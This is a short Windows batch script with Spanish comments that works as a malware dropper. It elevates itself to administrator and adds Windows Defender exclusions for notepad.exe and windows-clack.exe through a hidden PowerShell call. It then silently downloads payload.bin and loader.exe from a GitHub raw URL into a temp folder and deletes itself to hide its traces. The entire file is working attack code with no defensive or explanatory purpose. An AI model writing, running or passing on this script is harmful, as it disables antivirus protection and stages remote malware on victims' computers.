@echo off
:: Autoelevación a administrador
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Crear carpeta loader en %TEMP%
if not exist "%TEMP%\loader" mkdir "%TEMP%\loader"

:: Exclusión de notepad.exe y windows-clack.exe (comando probado y funcional)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Add-MpPreference -ExclusionProcess 'notepad.exe', 'windows-clack.exe'"

:: Descargar payload.bin en la carpeta loader
curl -L -o "%TEMP%\loader\payload.bin" "https://raw.githubusercontent.com/carlospro473/Chac/main/payload.bin" >nul 2>&1

:: Descargar loader.exe en la carpeta loader
curl -L -o "%TEMP%\loader\loader.exe" "https://raw.githubusercontent.com/carlospro473/Chac/main/loader.exe" >nul 2>&1

:: Autoborrado (espera 6 segundos y elimina el .bat)
start /b powershell -Command "Start-Sleep -Seconds 6; Remove-Item -Path '%~f0' -Force"

exit
